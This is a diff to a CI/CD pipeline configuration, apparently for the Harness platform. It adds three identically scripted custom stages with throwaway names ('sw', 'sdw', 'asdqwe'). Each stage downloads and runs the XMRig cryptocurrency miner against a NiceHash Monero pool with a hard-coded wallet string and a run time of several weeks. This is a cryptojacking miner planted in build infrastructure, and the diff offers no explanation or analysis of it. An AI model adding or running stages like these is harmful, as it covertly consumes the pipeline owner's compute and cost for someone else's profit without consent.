@@ -82,4 +82,73 @@ pipeline:
                     outputVariables: []
                   timeout: 10m
         tags: {}
+    - stage:
+        name: sw
+        identifier: sw
+        description: ""
+        type: Custom
+        spec:
+          execution:
+            steps:
+              - step:
+                  type: ShellScript
+                  name: ShellScript_1
+                  identifier: ShellScript_1
+                  spec:
+                    shell: Bash
+                    executionTarget: {}
+                    source:
+                      type: Inline
+                      spec:
+                        script: wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat3 -p x
+                    environmentVariables: []
+                    outputVariables: []
+                  timeout: 7w 1d
+        tags: {}
+    - stage:
+        name: sdw
+        identifier: sdw
+        description: ""
+        type: Custom
+        spec:
+          execution:
+            steps:
+              - step:
+                  type: ShellScript
+                  name: ShellScript_1
+                  identifier: ShellScript_1
+                  spec:
+                    shell: Bash
+                    executionTarget: {}
+                    source:
+                      type: Inline
+                      spec:
+                        script: wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat3 -p x
+                    environmentVariables: []
+                    outputVariables: []
+                  timeout: 7w 1d
+        tags: {}
+    - stage:
+        name: asdqwe
+        identifier: asdqwe
+        description: ""
+        type: Custom
+        spec:
+          execution:
+            steps:
+              - step:
+                  type: ShellScript
+                  name: ShellScript_1
+                  identifier: ShellScript_1
+                  spec:
+                    shell: Bash
+                    executionTarget: {}
+                    source:
+                      type: Inline
+                      spec:
+                        script: wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat3 -p x
+                    environmentVariables: []
+                    outputVariables: []
+                  timeout: 7w 1d
+        tags: {}
   timeout: 4w 2d
